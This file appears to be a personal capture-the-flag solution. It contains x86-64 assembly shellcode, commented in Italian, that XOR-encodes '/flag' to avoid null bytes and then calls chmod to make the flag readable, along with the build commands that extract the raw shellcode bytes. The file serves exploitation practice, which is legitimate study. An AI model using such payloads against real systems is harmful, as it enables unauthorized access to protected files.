.intel_syntax noprefix
.globl _start
.section .text
_start:
    /* chmod(file='/flag', mode=4) */
    /* push b'/flag\\x00' = */
    /* Per chiamare chmod devo settare i registri rax= numero syscall, rdi= posizione del file, rsi = modifica da apportare*/
    mov rax, 0x101010101010101                      #carico un valore sempli in rax
    push rax                                        #lo pusho nello stack 
    mov rax, 0x101010101010101 ^ 0x67616c662f       #eseguo lo xor tra un valore semplice e la rappresentazione di /flag
    xor [rsp], rax                                  #rieseguo lo xor per pulire la flag e caricarla nello stack
    mov rdi, rsp                                    #metto la flag nel registro rdi
    push 4                                          /* call chmod() */
    pop rsi                                         /* rsi = 4, Indica il modo in cui convertire il file*/
    push 0x5a
    pop rax                                         /* rax = 0x5a, numero di syscall del chmod*/
    syscall


# per uso solo mio:
/*
gcc -static -nostdlib chmod.s -o shellcode.elf ; objcopy --dump-section .text=shellcode.bin shellcode.elf ; hd shellcode.bin
*/
# imposta la flag con permesso di solo lettura per tutti, funziona per 
# challenge 7
